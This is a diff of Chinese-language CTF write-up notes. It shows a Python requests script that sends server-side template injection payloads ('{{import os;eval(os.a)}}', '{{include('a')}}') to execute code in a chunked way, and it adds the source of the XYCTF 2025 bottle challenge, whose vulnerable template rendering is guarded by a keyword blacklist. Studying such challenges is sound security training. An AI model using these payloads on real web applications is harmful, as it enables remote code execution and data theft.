@@ -178,5 +178,36 @@ r = requests.get(url,params={"payload":"{{import os;eval(os.a)}}"})
 r = requests.get(url,params={"payload":"{{include('a')}}"}).text  
 print(r)
 ```
-这里就是吧payload拆开一段一段写入
+这里就是吧payload利用for循环拆开一段一段写入到`os.a`中，最后执行`os.a`就是我们的完整`payload`
+最后在包含我们写入的文件，这里浏览器直接访问是不行的，，
+好像是因为flask网站中的路由不是根据文件映射的，是代码中写的，所以我们只能用include去包含它。
 ![](assets/Day%207/file-20251225135917613.png)
+# [XYCTF] 2025 出题人又疯
+```python
+# -*- encoding: utf-8 -*-
+'''
+@File    :   app.py
+@Time    :   2025/03/29 15:52:17
+@Author  :   LamentXU 
+'''
+import bottle
+'''
+flag in /flag
+'''
+@bottle.route('/')
+def index():
+    return 'Hello, World!'
+blacklist = [
+    'o', '\\', '\r', '\n', 'import', 'eval', 'exec', 'system', ' ', ';' , 'read'
+]
+@bottle.route('/attack')
+def attack():
+    payload = bottle.request.query.get('payload')
+    if payload and len(payload) < 25 and all(c not in payload for c in blacklist):
+        print(payload)
+        return bottle.template('hello '+payload)
+    else:
+        bottle.abort(400, 'Invalid payload')
+if __name__ == '__main__':
+    bottle.run(host='0.0.0.0', port=5000)
+```
